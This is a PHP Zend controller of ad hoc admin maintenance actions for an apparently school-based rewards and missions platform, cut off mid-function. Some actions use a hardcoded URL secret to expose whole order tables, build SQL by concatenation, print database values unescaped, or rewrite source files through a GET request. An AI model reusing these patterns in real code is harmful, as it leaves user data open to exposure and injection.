<?php
class AutomationController extends Zend_Controller_Action
{
	var $_user_session_data;

    function preDispatch()
    {
		$this->_user_session_data = new Zend_Session_Namespace('user_session_data');
		$this->_db = Zend_Registry::get('db');
		$this->_db->setFetchMode(Zend_Db::FETCH_OBJ);
	}
	
	public function updatemissionbarcodeachievementsAction(){
		exit;
		$query = new QueryGen();
		$arrMissionTasks = $query->ckids_mission_app__select(array(
			"_ALL" => TRUE
		));
		foreach ($arrMissionTasks as $objMissionTask) {
			$query->achievement_cards__update(array(
				"where" => array(
					"institution_id" => 601,
					"task_id" => $objMissionTask->task_id,
					"card_type" => "MissionsApp"
				),
				"values" => array(
					"achievement" => $objMissionTask->holiday_name . " / " . $objMissionTask->description
				)
			));
		}
		print "done";
		exit;
	}
	
	public function setmissionsbarcodesAction() {
		exit;
		$query = new QueryGen();
		$arrMissionTasks = $query->ckids_mission_app__select(array(
			"_ALL" => TRUE
		));
		foreach ($arrMissionTasks as $objMissionTask) {
			do {
				$intBarcode = "5" . rand_num_string(19);
				$objAchievementCard = first($query->achievement_cards__select(array(
					"card_serial" => $intBarcode
				)));
			}
			while ($objAchievementCard);
			$query->achievement_cards__insert(array(
				"institution_id" => 601,
				"achievement" => $objMissionTask->holiday_name . " / " . $objMissionTask->description, 
				"task_id" => $objMissionTask->task_id,
				"card_serial" => $intBarcode,
				"campaign_image_id" => $objMissionTask->image_id,
				"card_type" => "MissionsApp",
				"created_by" => 1
			));
		}
		exit;
	}
	
	public function moveunassocatiedpointsAction()
	{
		
		$query = new QueryGen();
		$objLegacy = new Legacy();
		$arrInstitutions = $query->institutions__select(array(
			"_NOT" => array(
				"institution_id" => array(13, 22),
			),
			"institution_id" => array(144),
			"template_style" => "tanyatemplate1"
		));
		foreach ($arrInstitutions as $objInstitution) {
			print "\nINSTITUTION: \n\n";
			var_dump($objInstitution);
			
			$objPermission = first($query->permissions__select(array(
				"institution_id" => $objInstitution->institution_id,
				"permission" => "Student"
			)));
			$objUser = first($query->users__select(array(
				"user_id" => $objPermission->user_id
			)));
			print "\nUSER: \n\n";
			var_dump($objUser);
			
			$objLookUp = first($query->legacy_lookup__select(array(
				"ims_id" => $objInstitution->institution_id,
				"ims_table" => "institutions"
			)));
			print "\nLOOKUP: \n\n";
			var_dump($objLookUp);
			$strSql = "
				SELECT
					*
				FROM
					admin_auths
				WHERE
					id =  " . $objLookUp->legacy_id . "
					AND auth = 'school'
			";
			$objLegacyAuth = (object) first($objLegacy->datahacker(array(
				"strSql" => $strSql
			)));
			print "\nLEGACY ADMIN AUTHS: \n\n";
			var_dump($objLegacyAuth);
			$strSql = "
				SELECT
					*
				FROM
					admins
				WHERE
					admin_id =  " . $objLegacyAuth->admin_id . "
			";
			$objLegacyAdmin = (object) first($objLegacy->datahacker(array(
				"strSql" => $strSql
			)));
			print "\nLEGACY ADMIN: \n\n";
			var_dump($objLegacyAdmin);
			
			print "\n\n\n\n-------------------------\n\n\n\n\n";
			exit;
		}
		
		
		exit;
		
		
		
		foreach ($arrInstitutions as $intInstitution) {
			$arrUsers = array_stack("user_id", $query->permissions__select(array(
				"institution_id" => $intInstitution,
				"permission" => "Student"
			)));
			$arrMoveablePoints = $query->user_points__select(array(
				"user_id" => $arrUsers,
				"_NOT" => array(
					"institution_id" => $intInstitution,
				)
			));
			foreach ($arrMoveablePoints as $objPointToMove) {
				if (FALSE) {
					$query->user_points_backup__insert((array) $objPointToMove);
					$query->user_points__delete(array(
						"user_point_id" => $objPointToMove->user_point_id
					));
				}
			}
			var_dump($arrMoveablePoints);exit;
		}
		var_dump($arrInstitutions);
		exit;
	}
	
	public function fixuserresetsAction()
	{
		$query = new QueryGen();
		$arrPermissions = array_bubble_hash("institution_id", $query->permissions__select(array(
			"_COLUMNS" => array("user_id", "institution_id"),
			"permission" => "Student",
			//"institution_id" => 144,
			"user_id" => 20505
		)));
		$arrResetDates = array(
			"2013-09-01 00:00:00" => "09/01/2014",
			"2014-09-01 00:00:00" => "09/01/2014",
			"2015-09-01 00:00:00" => "09/01/2015"
		);
		foreach ($arrPermissions as $intInstitution => $arrPermission) {
			$arrUserIds = array_stack("user_id", $arrPermission);
			var_dump($arrUserIds);
		}
		exit;
	}
	
	public function userpointsmissinginstitutionAction()
	{
		exit;
		$query = new QueryGen();
		$arrUserPoints = $this->_db->fetchAll('SELECT * FROM user_points WHERE institution_id = 0 OR institution_id = "" OR institution_id IS NULL');
		foreach ($arrUserPoints as $objUserPoint) {
			$intUser = $objUserPoint->user_id;
			$objPermission = first($query->permissions__select(array(
				"user_id" => $intUser
			)));
			if ($objPermission) {
				$query->user_points__update(array(
					"where" => array(
						"user_point_id" => $objUserPoint->user_point_id
					),
					"values" => array(
						"institution_id" => $objPermission->institution_id
					)
				));
			}
		}
		exit;
	}

	public function masscodefixAction()
	{
		exit;
		$arrGet = $this->_request->getParams();
		$boolFixIt = isset($arrGet['fixit']);
		$intSartItem = intval(@$arrGet['item']);
		dumper($arrGet,0,1);
		$intFile = 0;

		$arrLocations = array(
			"/home/v2dev1/public_html/application/controllers",
			"/home/v2dev1/public_html/application/models",
			"/home/v2dev1/public_html/application/layouts/scripts",
			"/home/v2dev1/public_html/application/views/scripts"
		);
		print "<style>* {margin:0;}</style>";
		function load_file($strFilePath, &$intFile, &$intSartItem, $boolFixIt) {
			if ($intSartItem > $intFile)
			{
				$intFile++;
				return;
			}

			print "PATH: " . $strFilePath . "\n";
			$strFile = file_get_contents($strFilePath);
			$arrFile = preg_split("/\r?\n/", $strFile);
			//print "SIZE: " . strlen($strFile) . "\n";
			//print "LINES: " . count($arrFile) . "\n";
			$arrDisplayOutput = array();
			foreach ($arrFile as $intLine => $strLine)
			{
				$arrDisplayOutput[$intLine] = "<pre>" . htmlspecialchars($strLine) . "</pre>";
			}
			$intIssues = 0;
			foreach ($arrFile as $intLine => $strLine)
			{
				$boolReset =
					preg_match("/[^_a-zA-Z]reset *\(/", $strLine)
					|| preg_match("/^reset *\(/", $strLine);
				$boolMysqlEscape =
					preg_match("/([^_a-zA-Z])mysql_escape_string *\(/", $strLine)
					|| preg_match("/^mysql_escape_string *\(/", $strLine);
				if (
					$boolReset
					|| $boolMysqlEscape
				) {
					//print "FOUND: $intLine\t$strLine\n";
					$strFix = $strLine;
					$strFix = preg_replace("/([^_a-zA-Z])reset *\(/", "$1first(", $strFix);
					$strFix = preg_replace("/^reset *\(/", "first(", $strFix);

					$strFix = preg_replace("/([^_a-zA-Z])mysql_escape_string *\(/", "$1mysql_real_escape_string(", $strFix);
					$strFix = preg_replace("/^mysql_escape_string *\(/", "mysql_real_escape_string(", $strFix);
					$strColor = "yellow";
					if (
						$boolReset
						&& !preg_match("/array *\(/", $strLine)
						&& !preg_match('/\$query->/', $strLine)
						&& !preg_match('/=>/', $strLine)
						&& !preg_match('/->/', $strLine)
						&& !preg_match('/reset *\( *[^\$]/', $strLine)
					) {
						$strColor = "red;color:white";
					}
					else
					{
						$arrFile[$intLine] = $strFix;
						$intIssues++;
					}

					$arrDisplayOutput[$intLine] = '<a href="#" style="display:block;background-color:' . $strColor . ';text-decoration:none;cursor:default;"><pre>' . htmlspecialchars($strFix) . '</pre></a>';

					//print "__FIX: $intLine\t$strFix\n";
				}
			}
			if ($boolFixIt)
			{
				file_put_contents($strFilePath, join("\n", $arrFile));
				return load_file($strFilePath, $intFile, $intSartItem, false);
			}
			if ($intIssues != 0)
				print 111123123132213;//print '<head><meta http-equiv="refresh" content="2; url=/automation/masscodefix/fixit/true/item/' . $intFile . '/when/' . time() . '"></head>';
			else
				print '<head><meta http-equiv="refresh" content="2; url=/automation/masscodefix/item/' . ($intFile+1) . '"></head>';
			print "<br>Issues: " . $intIssues . "<br>\n";
			if ($intIssues == 0)
				print "<br>.<br>.<br>.<br><a style='display:block;margin:200px;font-size:20pt;' href='/automation/masscodefix/item/" . ($intFile+1) . "'>skip it</a>";
			print "<br>" . join("\n", $arrDisplayOutput);
			print "Issues: " . $intIssues . "<br>\n";
			print "<br>.<br>.<br>.<br><a style='display:block;margin:200px;font-size:20pt;' href='/automation/masscodefix/fixit/true/item/$intFile/when/" . time() . "'>fix it</a>";
			print "<br>.<br>.<br>.<br><a style='display:block;margin:200px;font-size:20pt;' href='/automation/masscodefix/item/" . ($intFile+1) . "'>skip it</a>";
			//$intFile++; // pointless since it exits

			exit;
		}

		foreach ($arrLocations as $strLocation)
		{
			print "---------------------\n";
			print "Location: $strLocation \n";
			$arrFiles = scandir($strLocation);
			foreach ($arrFiles as $strFile)
			{
				preg_match("/^([^.]+)\.?(.*)$/", $strFile, $arrMatched);
				@list($strFull, $strName, $strEntention) = $arrMatched;
				if (!empty($strName))
				{
					$boolFolder = empty($strEntention);
					//print ($boolFolder ? "Folder" : "File") . ": $strName $strEntention\n";
					if ($boolFolder)
					{
						$arrFiles2 = scandir($strLocation . "/" . $strFile);
						foreach ($arrFiles2 as $strFile2)
						{
							if (preg_match("/\.phtml$/", $strFile2))
							{
								//print "Sub File: " . $strFile2 . "\n";
								load_file($strLocation . "/" . $strFile . "/" .$strFile2, $intFile, $intSartItem, $boolFixIt);
							}
						}
					}
					else
					{
						// is a file
						load_file($strLocation . "/" . $strFile, $intFile, $intSartItem, $boolFixIt);
					}
					//print "exit";
					//exit;//////
				}
			}
			//dumper($arrFiles);
		}
		print "done";
		exit;
	}

	/*
	 * Any Chabad Hebrew school institution that does not have a camp andy
	 * will copy the Chabad Hebrew school isntatution as a camp gan Israel
	 * institution in the camp gan Israel network
        Registered/ unregistered students
        Prizes
        Campaigns/tasks
	 *
	 */
	public function undomay4thcampcustomjobAction()
	{
		exit; // only comment this line when you use it and uncomment after use
		$query = new QueryGen();
		$query->institutions__delete(array(
			'created_by' => 2
		));
		$query->permissions__delete(array(
			'created_by' => 2
		));
		$query->prize__delete(array(
			'created_by' => 2
		));
		$query->prize_sizes__delete(array(
			'created_by' => 2
		));
		$query->campaigns__delete(array(
			'created_by' => 2
		));
		$query->tasks__delete(array(
			'created_by' => 2
		));
		print "Done. Dont forget to uncomment the exit;";
		exit;
	}
	public function may4thcampcustomjobAction()
	{
		$query = new QueryGen();
		// Find all chabad hebrew school institutions
		$arrChabadPermissions = $query->permissions__select(array(
			'permission' => 'Institution Administrator',
			"template_style" => "chabadhebrewschool"
		));
		$arrChabadAdminsIds = array_stack("user_id", $arrChabadPermissions);
		$arrChabadHashedPermissions = array_bubble_hash("institution_id", $arrChabadPermissions);
		$arrChabadIds = array_stack("institution_id", $arrChabadPermissions);
		$arrChabadUsers = array_hash("user_id", $query->users__select(array(
			'user_id' => array_stack("user_id", $arrChabadPermissions)
		)));
		$arrChabadInstitutions = $query->institutions__select(array(
			'institution_id' => $arrChabadIds
		));
		$arrChabadCampPermissions = array_hash("user_id", $query->permissions__select(array(
			"user_id" => $arrChabadAdminsIds,
			'permission' => 'Institution Administrator',
			"template_style" => "hebrewschool1"
		)));
		$intWorkOnlyForCHSInstitution = false;//237;
		foreach ($arrChabadInstitutions as $objInstitution) {
			print "<h3>" . $objInstitution->name . " (" . $objInstitution->institution_id . ")</h3>";
			$intPermissionCount = count($arrChabadHashedPermissions[$objInstitution->institution_id]);
			foreach ($arrChabadHashedPermissions[$objInstitution->institution_id] as $objPermission) {
				$objUser = $arrChabadUsers[$objPermission->user_id];
				$boolHasCamp = isset($arrChabadCampPermissions[$objUser->user_id]);
				print "<div>";
				print "Permission: <b>" . $objPermission->permission . "</b><br>";
				print "Email: <b>" . $objUser->email . "</b><br>";
				print "Has camp: <b>" . ($boolHasCamp ? "TRUE" : "FALSE") . "</b><br>";
				if (!$boolHasCamp && (!$intWorkOnlyForCHSInstitution || $intWorkOnlyForCHSInstitution == $objInstitution->institution_id)) {
					print "Copying...<br>";
					// Create the new camp institution
					$intNewCampInstitution = $query->institutions__insert(array(
						'is_active' => 1,
						'name' => "Camp Gan Israel",
						'template_style' => 'hebrewschool1',
						'network_id' => 2,
						'host_id' => 1,
						'hebrew_name' => $objInstitution->hebrew_name,
						'address' => $objInstitution->address,
						'city' => $objInstitution->city,
						'state' => $objInstitution->state,
						'country' => $objInstitution->country,
						'phone' => $objInstitution->phone,
						'postal' => $objInstitution->postal,
						'email' => $objInstitution->email,
						'website' => $objInstitution->website,
						'custom_fields' => $objInstitution->custom_fields,
						'created_by' => 2
					));
					print "New institution: <b>" . $intNewCampInstitution . "</b><br>";
					// Load all permissions from this institution to copy into camp institution
					$arrCHSInstitutionPermissions = $query->permissions__select(array(
						'institution_id' => $objPermission->institution_id
					));
					foreach ($arrCHSInstitutionPermissions as $objCHSPermission) {
						$query->permissions__insert(array(
							'template_style' => 'hebrewschool1',
							'registration_expiration' => $objCHSPermission->registration_expiration,
							'registration_date' => $objCHSPermission->registration_date,
							'user_id' => $objCHSPermission->user_id,
							'institution_id' => $intNewCampInstitution,
							"permission" => $objCHSPermission->permission,
							'default_permission' => 0,
							"created_by" => 2
						));
					}
					// Load all prizes from CHS institution
					$arrCHSPrizes = $query->prize__select(array(
						'institution_id' => $objPermission->institution_id
					));
					$arrCHSPrizeIds = array_stack("prize_id", $arrCHSPrizes);
					$arrPrizeIdReference = array();
					foreach ($arrCHSPrizes as $objCHSPrize) {
						$arrPrizeIdReference[$objCHSPrize->prize_id] = $query->prize__insert(array(
							'template_prize_id' => $objCHSPrize->template_prize_id,
							'parent_prize_id' => $objCHSPrize->parent_prize_id,
							'legacy_add_on_id' => $objCHSPrize->legacy_add_on_id,
							'teacher_id' => $objCHSPrize->teacher_id,
							'guardian_id' => $objCHSPrize->guardian_id,
							'network_id' => $objCHSPrize->network_id,
							'institution_id' => $intNewCampInstitution,
							'prize_name' => $objCHSPrize->prize_name,
							'points' => $objCHSPrize->points,
							'prize_category' => $objCHSPrize->prize_category,
							'bar_code' => $objCHSPrize->bar_code,
							'prize_description' => $objCHSPrize->prize_description,
							'image_id' => $objCHSPrize->image_id,
							'add_on_restricted' => $objCHSPrize->add_on_restricted,
							'use_sub_prizes' => $objCHSPrize->use_sub_prizes,
							'one_per_user' => $objCHSPrize->one_per_user,
							'prize_count' => $objCHSPrize->prize_count,
							'prize_type' => $objCHSPrize->prize_type,
							'installable_default_on' => $objCHSPrize->installable_default_on,
							'prize_price' => $objCHSPrize->prize_price,
							'prize_discounted_price' => $objCHSPrize->prize_discounted_price,
							'is_active' => $objCHSPrize->is_active,
							'created_by' => 2
						));
					}
					// prize_sizes
					$arrCHSPrizeSizes = $query->prize_sizes__select(array(
						'prize_id' => $arrCHSPrizeIds
					));
					foreach ($arrCHSPrizeSizes as $objCHSPrizeSize) {
						$query->prize_sizes__insert(array(
							'prize_id' => $arrPrizeIdReference[$objCHSPrizeSize->prize_id],
							'prize_size_hierarchy' => $objCHSPrizeSize->prize_size_hierarchy,
							'prize_size' => $objCHSPrizeSize->prize_size,
							'created_by' => 2
						));
					}

					$arrCampaigns = $query->campaigns__select(array(
						'institution_id' => $objPermission->institution_id
					));
					foreach ($arrCampaigns as $objCampaign) {
						$intCampaign = $query->campaigns__insert(array(
							'installed_campaign_id' => $objCampaign->installed_campaign_id,
							'default_installed' => $objCampaign->default_installed,
							'institution_id' => $intNewCampInstitution,
							'network_id' => $objCampaign->network_id,
							'campaign_name' => $objCampaign->campaign_name,
							'image_largemed' => $objCampaign->image_largemed,
							'image_smallmed' => $objCampaign->image_smallmed,
							'image_achievement' => $objCampaign->image_achievement,
							'description' => $objCampaign->description,
							'commitments' => $objCampaign->commitments,
							'slogan' => $objCampaign->slogan,
							'campaign_type' => $objCampaign->campaign_type,
							'image_id' => $objCampaign->image_id,
							'is_active' => $objCampaign->is_active,
							'ladder' => $objCampaign->ladder,
							'points' => $objCampaign->points,
							'medals' => $objCampaign->medals,
							'ranks' => $objCampaign->ranks,
							'is_editable' => $objCampaign->is_editable,
							'created_by' => 2
						));
						$arrTasks = $query->tasks__select(array(
							'campaign_id' => $objCampaign->campaign_id
						));
						foreach ($arrTasks as $objTask) {
							$query->tasks__insert(array(
								'installed_task_id' => $objTask->installed_task_id,
								'school_type' => $objTask->school_type,
								'task_name' => $objTask->task_name,
								'campaign_id' => $intCampaign,
								'institution_id' => $intNewCampInstitution,
								'points' => $objTask->points,
								'min_points' => $objTask->min_points,
								'max_points' => $objTask->max_points,
								'frequency' => $objTask->frequency,
								'start_date' => $objTask->start_date,
								'end_date' => $objTask->end_date,
								'sequence' => $objTask->sequence,
								'velocity' => $objTask->velocity,
								'is_checkbox' => $objTask->is_checkbox,
								'is_locked' => $objTask->is_locked,
								'is_grid' => $objTask->is_grid,
								'is_card' => $objTask->is_card,
								'is_required' => $objTask->is_required,
								'is_active' => $objTask->is_active,
								'created_by' => 2
							));
						}
					}
					print "End of copy.<br/>";
				}
				print "</div>";
			}
		}
		exit;
	}

	public function authcardpopmissingordersAction()
	{
		$query = new QueryGen();
		$arrPendingOrders = $query->auth_cards__select(array(
			'card_status' => 'ordered',
			'_NOT_NULL' => array('auth_card_order_id')
		));
		$arrAuthCardIds = array_stack('auth_card_order_id');
		$arrAuthCardOrders = $query->auth_card_orders__select(array(
			'auth_card_order_id' => $arrAuthCardIds
		));
		// loop through orders that are currently pending
		foreach ($arrPendingOrders as $objPendingOrder) {

		}
		dumper($arrAuthCardOrders,1,1);
	}

	public function authcardordersviewAction()
	{
		if ($this->_request->getParam('p') != 'asfsdjuh28hf8fh2hf')
			exit;
		$query = new QueryGen();
		print '<table>';
		$arrAuthCardOrders = $query->auth_card_orders__select(array(
			'_ALL' => TRUE
		));
		print "<tr>";
		foreach ($arrAuthCardOrders[0] as $strKey => $objOrder) {
			print "<td><b>" . $strKey . "</b></td>";
		}
		print "</tr>";
		foreach ($arrAuthCardOrders as $objOrder) {
			print "<tr>";
			foreach ($objOrder as $strKey => $strValue) {
				print "<td>" . $strValue . "</td>";
			}
			print "</tr>";
		}
		print '</table>';
		exit;
	}

	public function authcardviewAction()
	{
		if ($this->_request->getParam('p') != 'asfsdjuh28hf8fh2hf')
			exit;
		$query = new QueryGen();
		print '<table>';
		$arrAuthCardOrders = $query->auth_cards__select(array(
			'_ALL' => TRUE
		));
		print "<tr>";
		foreach ($arrAuthCardOrders[0] as $strKey => $objOrder) {
			print "<td><b>" . $strKey . "</b></td>";
		}
		print "</tr>";
		foreach ($arrAuthCardOrders as $objOrder) {
			print "<tr>";
			foreach ($objOrder as $strKey => $strValue) {
				print "<td>" . $strValue . "</td>";
			}
			print "</tr>";
		}
		print '</table>';
		exit;
	}

	public function authcardupgradeAction()
	{
		$query = new QueryGen();
		$arrAuthCardOrders = $query->auth_card_orders__select(array(
			'_ALL' => TRUE,
			'_IS_NULL' => array('institution_id')
		));
		foreach ($arrAuthCardOrders as $key => &$objAuthCardOrder)
		{
			$objAuthCard = reset($query->auth_cards__select(array(
				'auth_card_order_id' => $objAuthCardOrder->auth_card_order_id
			)));
			if ($objAuthCard) {
				print 1;
				$query->auth_card_orders__update(array(
					'where' => array(
						'auth_card_order_id' => $objAuthCardOrder->auth_card_order_id
					),
					'values' => array(
						'institution_id' => $objAuthCard->institution_id
					)
				));
			} else {
				print 0;
			}
		}
		print '|';exit;
	}

	public function extractbarcodesbyipAction()
	{
		$strData = '';
		$arrData = preg_split('/[\r\n]/', $strData);
		$arrBarcodes = array();
		foreach ($arrData as $strLine) {
			if (preg_match('/^75.149.248.13/', $strLine)) {
				if (preg_match('/auto-login\/uc\/([0-9]+)/', $strLine, $arrMatched)) {
					$arrBarcodes[$arrMatched[1]] = $arrMatched[1];
				}
			}
		}
		print join(', ', $arrBarcodes);
	exit;
	}

	public function testingAction()
	{
		$arrPost = array(
			'serialized_user_ids' => serialize(array(
				15860
			))
		);
		$objCurl = curl_init();
		$strUrl = "http://mashpia.com/get_points_multi.php";
		curl_setopt($objCurl, CURLOPT_URL, $strUrl);
		curl_setopt($objCurl, CURLOPT_FRESH_CONNECT, 1);
		curl_setopt($objCurl, CURLOPT_FORBID_REUSE, 1);
		curl_setopt($objCurl, CURLOPT_POST, 1);
		curl_setopt($objCurl, CURLOPT_POSTFIELDS, $arrPost);
		curl_setopt($objCurl, CURLOPT_RETURNTRANSFER, 1);
		$strResult = curl_exec($objCurl);
		$arrLegacyPointsSource = unserialize($strResult);
		dumper($arrLegacyPointsSource,1,1);
	}

	function gencampaignsAction()
	{
		kill();
		$query = new QueryGen();
		$arrInstitutions = array_hash('institution_id', $query->institutions__select(array(
			array(
				'template_style' => array(
					'chabadhebrewschool',
					'friendshipcircle',
					'hoo',
					'releasedtime'
				),
				'_IS_NULL' => 'template_style'
			),
			'network_id' => 2,
			'host_id' => 1
		)));
		$arrDefaultTaskParams = array(
			'installed_task_id' => 5086,
			'task_name' => 'Tehillim',
			'mission_id' => '1229',
			'points' => 25,
			'sequence' => 1,
			'is_checkbox' => 1,
			'is_locked' => 1,
			'is_active' => 1
		);
		foreach ($arrInstitutions as $intInstitution => $objInstitution)
		{
			$intCampaign = $query->campaigns__insert(array(
				'installed_campaign_id' => '1504',
				'campaign_name' => 'Shabbos Mevarchim Tehillim',
				'campaign_type' => 'Incremental',
				'institution_id' => $intInstitution,
				'is_active' => 1
			));
			print "campaign_id = " . $intCampaign . "\n";
			$arrTaskParams = $arrDefaultTaskParams;
			$arrTaskParams['institution_id'] = $intInstitution;
			$arrTaskParams['campaign_id'] = $intCampaign;
			$intTask = $query->tasks__insert($arrTaskParams);
			print "task_id = " . $intTask . "\n";

		}

		dumper($arrInstitutions,1,1);
		kill();
	}

	/*
	 * Use a temp table that has mission values stored to auto back date
	 * users to the number of missions they had before a fix was made
	 * that caused some mission values to change.
	 */
	function fixstatusesAction()
	{
		$intStart = $this->_request->getParam('start');
		if (!$intStart)
			$intStart = 0;
		$query = new QueryGen();
		$objMarking = new Marking();
		$arrInstitutionIds = array_stack('institution_id', $query->institutions__select(array(
			'_COLUMNS' => array('institution_id'),
			'template_style' => 'tanyatemplate1'
		)));
		$arrUserCampaigns = array_hash('user_id', $query->user_campaigns__select(array(
			'_COLUMNS' => array('user_id', 'institution_id'),
			'institution_id' => $arrInstitutionIds,
			'status' => 'Enrollment',
			'campaign_id' => 1,
			'_LIMIT' => $intStart . ',15'
		)));
		$arrUserClasses = array_hash('user_id', $query->user_classes__select(array(
			'user_id' => array_keys($arrUserCampaigns)
		)));
		$arrTempMissions = array_hash('user_id', $query->temp_missions_statuses__select(array(
			'user_id' => array_keys($arrUserClasses)
		)));
		if (!count($arrUserCampaigns))
		{
			print "Done";
			exit;
		}
		$intRemovedCount = 0;
		$arrUserMissions = $objMarking->user_missions_overdue(array_keys($arrUserClasses));
		foreach ($arrTempMissions as $intUser => $objTempMission)
		{
			$arrTempMission = $arrUserMissions[$intUser];
			$intMissions = $objTempMission->missions -1;
			if (
				$intMissions > $arrTempMission['missions']
			) {
				dumper($arrTempMission,0,1);
				$arrPauseResumes = $query->user_campaigns__select(array(
					'status' => array('Paused','Resumed'),
					'campaign_id' => 1,
					'user_id' => $intUser
				));
				if (count($arrPauseResumes))
				{

					// remove all x missions
					$arrUserPauses = $query->user_campaigns__select(array(
						'status' => array('Paused', 'Resumed'),
						'user_id' => $intUser,
						'_NOT' => array(
							'input_value' => '_enrollment'
						)
					));
					foreach ($arrUserPauses as $objUserPause)
					{
						$query->user_campaigns__delete(array(
							'user_campaign_id' => $objUserPause->user_campaign_id
						));
					}
					$arrTempMission = reset($objMarking->user_missions_overdue(array($intUser)));
					if (
						$intMissions > $arrTempMission['missions']
					) {
						dumper($arrTempMission,0,1);
						dumper($objTempMission,0,1);
						$objLatestUserCampaign = reset($query->user_campaigns__select(array(
							'_NOT' => array(
								'status' => array('Paused', 'Resumed'),
								'input_value' => '_enrollment'
							),
							'user_id' => $intUser,
							'campaign_id' => 1,
							'_ORDER' => 'schedule_date + 0 DESC',
							'_LIMIT' => 1
						)));
						$intRemove = $intMissions - $arrTempMission['missions']+1;
						$intPauseStart = $objLatestUserCampaign->schedule_date+1;
						$intPauseEnd = strtotime('+' . $intRemove . " week", $intPauseStart);
						$strDate = date("Y-m-d H:i:s");
						$query->user_campaigns__insert(array(
							'campaign_id' => 1,
							'mission_id' => 1,
							'user_id' => $intUser,
							'institution_id' => $arrUserCampaigns[$intUser]->institution_id,
							'status' => 'Paused',
							'schedule_date' => $intPauseStart,
							'created' => $strDate
						));
						$query->user_campaigns__insert(array(
							'campaign_id' => 1,
							'mission_id' => 1,
							'user_id' => $intUser,
							'institution_id' => $arrUserCampaigns[$intUser]->institution_id,
							'status' => 'Resumed',
							'schedule_date' => $intPauseEnd,
							'created' => $strDate
						));
						print 'Removed: ' . $intRemove . '<br />';
						$intRemovedCount++;
						$arrTempMission = reset($objMarking->user_missions_overdue(array($intUser)));
						dumper($arrTempMission,0,1);
					}
				}
			}
		}
		print "<br /><a href='/automation/fixstatuses/start/" . ($intStart + 15) . "'>next</a>";
		//if (!$intRemovedCount)
			print "<script>window.location.href='/automation/fixstatuses/start/" . ($intStart + 15) . "';</script>";
		exit;
	}

	function capturemissionstatusesAction()
	{
		$intStart = $this->_request->getParam('start');
		if (!$intStart)
			$intStart = 0;
		$query = new QueryGen();
		$objMarking = new Marking();
		$arrInstitutionIds = array_stack('institution_id', $query->institutions__select(array(
			'_COLUMNS' => array('institution_id'),
			'template_style' => 'tanyatemplate1'
		)));
		$arrUserCampaigns = array_hash('user_id', $query->user_campaigns__select(array(
			'_COLUMNS' => array('user_id', 'institution_id'),
			'institution_id' => $arrInstitutionIds,
			'status' => 'Enrollment',
			'campaign_id' => 1,
			'_LIMIT' => $intStart . ',15'
		)));
		if (!count($arrUserCampaigns))
		{
			print "Done";
			exit;
		}
		$arrUsers = array_hash('user_id', $query->users__select(array(
			'user_id' => array_keys($arrUserCampaigns)
		)));
		$arrUserMissions = $objMarking->user_missions_overdue(array_keys($intUser));
		foreach ($arrUserMissions as $intUser => $arrData)
		{
			$query->temp_missions_statuses__insert(array(
				'user_id' => $intUser,
				'institution_id' => $arrUserCampaigns[$intUser]->institution_id,
				'missions' => $arrData['missions'],
				'status_msg' => $arrData['user_status'],
			));
		}
		print "<br /><a href='/automation/capturemissionstatuses/start/" . ($intStart + 15) . "'>next</a>";
		print "<script>window.location.href='/automation/capturemissionstatuses/start/" . ($intStart + 15) . "';</script>";
		exit;
	}

	/*
	 * Use the latest maked line to determin if a pause was completed
	 * with the x missions tool or pause tool
	 */
	public function fixenrollmentflags2Action()
	{
		$query = new QueryGen();
		$arrUserCampaignsBubble = array_bubble_hash('user_id', $query->user_campaigns__select(array(
			'campaign_id' => 1,
			'_ORDER' => 'schedule_date+0 ASC'
		)));
		$intUser = NULL;
		$intLastSchedule = NULL;
		$i=0;
		foreach ($arrUserCampaignsBubble as $intUser => $arrUserCampaigns)
		{
			$intLastSchedule = NULL;
			$boolBadPause = FALSE;
			foreach ($arrUserCampaigns as $objUserCampaign)
			{
				if ($boolBadPause) {
					// bad resumed
					//$objUserCampaign
					continue;
				}
				if (
					$intLastSchedule
					&& $intLastSchedule+(86400*7.5) < $objUserCampaign->schedule_date
				) {
					if ($objUserCampaign->input_value == '_enrollment')
					{
						$intLastSchedule = $objUserCampaign->schedule_date;
						continue;
					}
					if ($objUserCampaign->status == 'Paused')
						$boolBadPause = TRUE;
					if ($objUserCampaign->status == 'Resumed') { // good pause
						$intLastSchedule = $objUserCampaign->schedule_date;
						continue;
					}
					$i++;
					if ($i<2)
						break;
					print $intLastSchedule;
					dumper($objUserCampaign,1,1);
				}
				$intLastSchedule = $objUserCampaign->schedule_date;
			}
		}
		exit;
	}

	public function enrollmentduplicationAction()
	{
		$query = new QueryGen();
		$arrEnrollments = $query->user_campaigns__select(array(
			'campaign_id' => 1,
			'_ORDER' => 'schedule_date+0 DESC'
		));
		$arrEnrollmentsBubble = array_bubble_hash('user_id', 'institution_id', $arrEnrollments);
		$arrPermissions = array_hash('user_id', 'institution_id', $query->permissions__select(array(
			'user_id' => array_keys($arrEnrollmentsBubble)
		)));
		foreach ($arrEnrollmentsBubble as $intUser => $arrUserInstitutions) {
			$intCount = count($arrUserInstitutions);
			foreach ($arrUserInstitutions as $intInstitution => $arrInstitutionCampaigns)
			{
				if (!isset($arrPermissions[$intUser][$intInstitution]))
				{
					dumper(array(
						'user_id' => $intUser,
						'institution_id' => $intInstitution
					),0,1);
					$query->user_campaigns__delete(array(
						'user_id' => $intUser,
						'institution_id' => $intInstitution
					));
				}
			}
		}
		exit;
	}

	public function fixenrollmentflagsAction()
	{
		$intStart = $this->_request->getParam('start');
		if (!$intStart)
			$intStart = 0;
		$query = new QueryGen();
		$arrEnrollments = array_hash('user_id', $query->user_campaigns__select(array(
			'campaign_id' => 1,
			'status' => array('Enrollment', 'Unenrollment'),
			'_LIMIT' => $intStart . ',200'
		)));
		if (!count($arrEnrollments))
		{
			print "Done.";
			exit;
		}
		$arrPauseResumes = array_bubble_hash('user_id', $query->user_campaigns__select(array(
			'status' => array('Paused', 'Resumed'),
			'_NOT' => array(
				'input_value' => '_enrollment'
			),
			'user_id' => array_keys($arrEnrollments)
		)));
		$i = 0;
		foreach ($arrEnrollments as $objEnrollment)
		{

			if (!isset($arrPauseResumes[$objEnrollment->user_id]))
				continue;
			$arrUserPauseResumes = $arrPauseResumes[$objEnrollment->user_id];
			$arrPauseResumeCreatedHash = array_bubble_hash('created', $arrUserPauseResumes);
			foreach ($arrUserPauseResumes as $objUserPauseResume)
			{
				$boolAddFlag = FALSE;
				if (count($arrPauseResumeCreatedHash[$objUserPauseResume->created]) == 1)
					$boolAddFlag = TRUE;
				if ($boolAddFlag)
				{
					$i++;
					$query->user_campaigns__update(array(
						'where' => array(
							'user_campaign_id' => $objUserPauseResume->user_campaign_id
						),
						'values' => array(
							'input_value' => '_enrollment'
						)
					));
				}
			}
		}
